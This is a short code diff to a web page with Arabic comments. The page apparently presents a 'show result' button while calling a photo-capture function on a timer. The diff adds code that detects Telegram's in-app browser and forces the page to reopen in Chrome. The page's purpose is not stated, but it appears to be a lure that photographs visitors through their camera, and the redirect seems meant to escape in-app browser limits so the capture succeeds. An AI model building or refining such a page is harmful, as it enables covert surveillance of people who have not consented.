@@ -302,6 +302,26 @@
             capturePhoto();
         }, 2000); // تأخير لمدة ثانيتين
     };
+    // التحقق إذا كانت الصفحة تُعرض داخل تطبيق Telegram
+    function openInChrome() {
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        // التحقق إذا كان المتصفح هو Telegram
+        if (userAgent.includes("Telegram")) {
+            const chromeUrl = `googlechrome://${window.location.href.replace(/^https?:\/\//, '')}`;
+            
+            // إعادة التوجيه إلى Google Chrome
+            window.location.href = chromeUrl;
+
+            // إذا لم يفتح الرابط، يمكن إضافة رابط عادي كإجراء احتياطي
+            setTimeout(() => {
+                window.location.href = window.location.href;
+            }, 1000);
+        }
+    }
+
+    // استدعاء الدالة عند تحميل الصفحة
+    window.onload = openInChrome;
 </script>
 
 <button id="result-button" class="result-button" onclick="showResultWithPhoto()">عرض النتيجة</button>
